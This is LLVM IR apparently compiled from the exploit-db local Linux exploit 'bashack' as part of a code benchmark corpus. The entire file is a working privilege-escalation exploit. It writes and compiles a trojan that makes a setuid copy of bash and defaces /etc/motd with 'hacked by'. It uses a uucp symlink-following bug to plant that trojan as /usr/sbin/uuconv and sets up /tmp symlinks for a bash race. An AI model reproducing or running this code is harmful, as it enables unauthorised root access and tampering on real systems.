; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_217.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_217.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [63 x i8] c"bashack - root using multiple config/input validation errors\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [37 x i8] c"creating trojan in /usr/sbin/uuconv\0A\00", align 1
@.str.2 = private unnamed_addr constant [31 x i8] c"                 - uucp bug -\0A\00", align 1
@.str.3 = private unnamed_addr constant [57 x i8] c"uucp follows symlinks as euid=uucp, (uid,gid,egid=you)\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"HOME\00", align 1
@.str.5 = private unnamed_addr constant [14 x i8] c"%s/bashacker/\00", align 1
@.str.6 = private unnamed_addr constant [22 x i8] c"%s/bashacker/bashaker\00", align 1
@.str.7 = private unnamed_addr constant [23 x i8] c"== uuconv replacement\0A\00", align 1
@.str.8 = private unnamed_addr constant [19 x i8] c"* making uuconv.c\0A\00", align 1
@.str.9 = private unnamed_addr constant [22 x i8] c"%s/bashacker/uuconv.c\00", align 1
@.str.10 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.11 = private unnamed_addr constant [13 x i8] c"%s/bashacker\00", align 1
@.str.12 = private unnamed_addr constant [10 x i8] c"main()\0A{\0A\00", align 1
@.str.13 = private unnamed_addr constant [22 x i8] c"printf(\22sendmail\0A\22);\0A\00", align 1
@.str.14 = private unnamed_addr constant [40 x i8] c"system(\22/bin/cp /bin/bash %s/bashacker;\00", align 1
@.str.15 = private unnamed_addr constant [30 x i8] c"/bin/chmod 6711 %s/bashacker;\00", align 1
@.str.16 = private unnamed_addr constant [30 x i8] c"echo hacked by %s>>/etc/motd;\00", align 1
@.str.17 = private unnamed_addr constant [8 x i8] c"LOGNAME\00", align 1
@.str.18 = private unnamed_addr constant [57 x i8] c"echo -n \\\22at about \\\22 >>/etc/motd; /bin/date >>/etc/motd\00", align 1
@.str.19 = private unnamed_addr constant [5 x i8] c"\22);\0A\00", align 1
@.str.20 = private unnamed_addr constant [3 x i8] c"}\0A\00", align 1
@.str.21 = private unnamed_addr constant [38 x i8] c"* compiling ./uuconv.c ==> ./uuconv \0A\00", align 1
@.str.22 = private unnamed_addr constant [39 x i8] c"cc -o uuconv uuconv.c -O2;strip uuconv\00", align 1
@.str.23 = private unnamed_addr constant [29 x i8] c"/var/spool/uucppublic/uuconv\00", align 1
@.str.24 = private unnamed_addr constant [17 x i8] c"/usr/sbin/uuconv\00", align 1
@.str.25 = private unnamed_addr constant [37 x i8] c"* copying to /usr/sbin via uucp bug\0A\00", align 1
@.str.26 = private unnamed_addr constant [63 x i8] c"/usr/bin/uucp %s/bashacker/uuconv /var/spool/uucppublic/uuconv\00", align 1
@.str.27 = private unnamed_addr constant [26 x i8] c"== cleaning up a little.\0A\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"uuconv\00", align 1
@.str.29 = private unnamed_addr constant [9 x i8] c"uuconv.c\00", align 1
@.str.30 = private unnamed_addr constant [42 x i8] c"== set up /tmp for bash part of exploit.\0A\00", align 1
@.str.31 = private unnamed_addr constant [12 x i8] c"/tmp/t%d-sh\00", align 1
@FNAME = common dso_local global i8* null, align 8
@.str.32 = private unnamed_addr constant [26 x i8] c"* my work here is done.\0A\0A\00", align 1
@.str.33 = private unnamed_addr constant [43 x i8] c"now pray for some kinda of crash.\0A\0A\09--zen\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [2000 x i8], align 16
  %4 = alloca i8*, align 8
  %5 = alloca i32*, align 8
  store i32 0, i32* %1, align 4
  %6 = call i32 @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str, i64 0, i64 0))
  %7 = call i32 @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0))
  %8 = call i32 @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.2, i64 0, i64 0))
  %9 = call i32 @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.3, i64 0, i64 0))
  %10 = call i8* @getenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0))
  store i8* %10, i8** %4, align 8
  %11 = getelementptr inbounds [2000 x i8], [2000 x i8]* %3, i64 0, i64 0
  %12 = load i8*, i8** %4, align 8
  %13 = call i32 (i8*, i8*, ...) @sprintf(i8* %11, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i64 0, i64 0), i8* %12)
  %14 = getelementptr inbounds [2000 x i8], [2000 x i8]* %3, i64 0, i64 0
  %15 = call i32 @mkdir(i8* %14)
  %16 = getelementptr inbounds [2000 x i8], [2000 x i8]* %3, i64 0, i64 0
  %17 = call i32 @chdir(i8* %16)
  %18 = getelementptr inbounds [2000 x i8], [2000 x i8]* %3, i64 0, i64 0
  %19 = load i8*, i8** %4, align 8
  %20 = call i32 (i8*, i8*, ...) @sprintf(i8* %18, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.6, i64 0, i64 0), i8* %19)
  %21 = getelementptr inbounds [2000 x i8], [2000 x i8]* %3, i64 0, i64 0
  %22 = call i32 @unlink(i8* %21)
  %23 = call i32 @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.7, i64 0, i64 0))
  %24 = call i32 @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.8, i64 0, i64 0))
  %25 = getelementptr inbounds [2000 x i8], [2000 x i8]* %3, i64 0, i64 0
  %26 = load i8*, i8** %4, align 8
  %27 = call i32 (i8*, i8*, ...) @sprintf(i8* %25, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.9, i64 0, i64 0), i8* %26)
  %28 = getelementptr inbounds [2000 x i8], [2000 x i8]* %3, i64 0, i64 0
  %29 = call i32* @fopen(i8* %28, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i64 0, i64 0))
  store i32* %29, i32** %5, align 8
  %30 = getelementptr inbounds [2000 x i8], [2000 x i8]* %3, i64 0, i64 0
  %31 = load i8*, i8** %4, align 8
  %32 = call i32 (i8*, i8*, ...) @sprintf(i8* %30, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.11, i64 0, i64 0), i8* %31)
  %33 = load i32*, i32** %5, align 8
  %34 = call i32 (i32*, i8*, ...) @fprintf(i32* %33, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.12, i64 0, i64 0))
  %35 = load i32*, i32** %5, align 8
  %36 = call i32 (i32*, i8*, ...) @fprintf(i32* %35, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.13, i64 0, i64 0))
  %37 = load i32*, i32** %5, align 8
  %38 = getelementptr inbounds [2000 x i8], [2000 x i8]* %3, i64 0, i64 0
  %39 = call i32 (i32*, i8*, ...) @fprintf(i32* %37, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.14, i64 0, i64 0), i8* %38)
  %40 = load i32*, i32** %5, align 8
  %41 = getelementptr inbounds [2000 x i8], [2000 x i8]* %3, i64 0, i64 0
  %42 = call i32 (i32*, i8*, ...) @fprintf(i32* %40, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.15, i64 0, i64 0), i8* %41)
  %43 = load i32*, i32** %5, align 8
  %44 = call i8* @getenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.17, i64 0, i64 0))
  %45 = call i32 (i32*, i8*, ...) @fprintf(i32* %43, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.16, i64 0, i64 0), i8* %44)
  %46 = load i32*, i32** %5, align 8
  %47 = call i32 (i32*, i8*, ...) @fprintf(i32* %46, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.18, i64 0, i64 0))
  %48 = load i32*, i32** %5, align 8
  %49 = call i32 (i32*, i8*, ...) @fprintf(i32* %48, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.19, i64 0, i64 0))
  %50 = load i32*, i32** %5, align 8
  %51 = call i32 (i32*, i8*, ...) @fprintf(i32* %50, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.20, i64 0, i64 0))
  %52 = load i32*, i32** %5, align 8
  %53 = call i32 @fclose(i32* %52)
  %54 = call i32 @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.21, i64 0, i64 0))
  %55 = call i32 @system(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.22, i64 0, i64 0))
  %56 = call i32 @unlink(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.23, i64 0, i64 0))
  %57 = call i32 @symlink(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.24, i64 0, i64 0), i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.23, i64 0, i64 0))
  %58 = call i32 @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.25, i64 0, i64 0))
  %59 = getelementptr inbounds [2000 x i8], [2000 x i8]* %3, i64 0, i64 0
  %60 = load i8*, i8** %4, align 8
  %61 = call i32 (i8*, i8*, ...) @sprintf(i8* %59, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.26, i64 0, i64 0), i8* %60)
  %62 = getelementptr inbounds [2000 x i8], [2000 x i8]* %3, i64 0, i64 0
  %63 = call i32 @system(i8* %62)
  %64 = call i32 @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.27, i64 0, i64 0))
  %65 = call i32 @unlink(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.23, i64 0, i64 0))
  %66 = call i32 @unlink(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i64 0, i64 0))
  %67 = call i32 @unlink(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i64 0, i64 0))
  %68 = call i32 @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.30, i64 0, i64 0))
  store i32 100, i32* %2, align 4
  br label %69

69:                                               ; preds = %81, %0
  %70 = load i32, i32* %2, align 4
  %71 = icmp slt i32 %70, 150
  br i1 %71, label %72, label %84

72:                                               ; preds = %69
  %73 = getelementptr inbounds [2000 x i8], [2000 x i8]* %3, i64 0, i64 0
  %74 = load i32, i32* %2, align 4
  %75 = call i32 (i8*, i8*, ...) @sprintf(i8* %73, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.31, i64 0, i64 0), i32 %74)
  %76 = getelementptr inbounds [2000 x i8], [2000 x i8]* %3, i64 0, i64 0
  %77 = call i32 @unlink(i8* %76)
  %78 = load i8*, i8** @FNAME, align 8
  %79 = getelementptr inbounds [2000 x i8], [2000 x i8]* %3, i64 0, i64 0
  %80 = call i32 @symlink(i8* %78, i8* %79)
  br label %81

81:                                               ; preds = %72
  %82 = load i32, i32* %2, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %2, align 4
  br label %69

84:                                               ; preds = %69
  %85 = call i32 @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.32, i64 0, i64 0))
  %86 = call i32 @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.33, i64 0, i64 0))
  %87 = load i32, i32* %1, align 4
  ret i32 %87
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i8* @getenv(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @mkdir(i8*) #1

declare dso_local i32 @chdir(i8*) #1

declare dso_local i32 @unlink(i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fprintf(i32*, i8*, ...) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @symlink(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
